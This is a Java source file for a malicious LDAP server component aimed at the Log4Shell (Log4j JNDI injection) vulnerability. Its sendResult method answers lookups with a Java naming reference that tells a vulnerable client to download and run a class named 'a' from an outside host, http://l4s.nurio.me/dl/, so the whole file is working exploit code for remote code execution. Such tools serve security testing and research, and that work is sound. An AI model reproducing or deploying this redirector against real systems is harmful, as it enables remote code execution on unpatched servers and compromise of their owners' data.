package me.nurio.simpleldap;

import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import java.net.MalformedURLException;
import java.net.URL;

public class BasicController {

    private static final String CODE_BASE = "http://l4s.nurio.me/dl/";
    private static final String CLASS_NAME = "a";
    private static final String PRINT_MSG = "Nurio's Log4Shell";

    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws LDAPException, MalformedURLException {
        System.out.println("[+] Sending LDAP ResourceRef result for " + base + " with basic remote reference payload");

        URL url = new URL(new URL(CODE_BASE), CLASS_NAME + ".class");
        System.out.println("[+] Send LDAP reference result for " + base + " redirecting to " + url);

        Entry entry = new Entry(base);
        entry.addAttribute("javaClassName", PRINT_MSG);
        entry.addAttribute("javaCodeBase", CODE_BASE);
        entry.addAttribute("objectClass", "javaNamingReference");
        entry.addAttribute("javaFactory", CLASS_NAME);

        result.sendSearchEntry(entry);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }

}
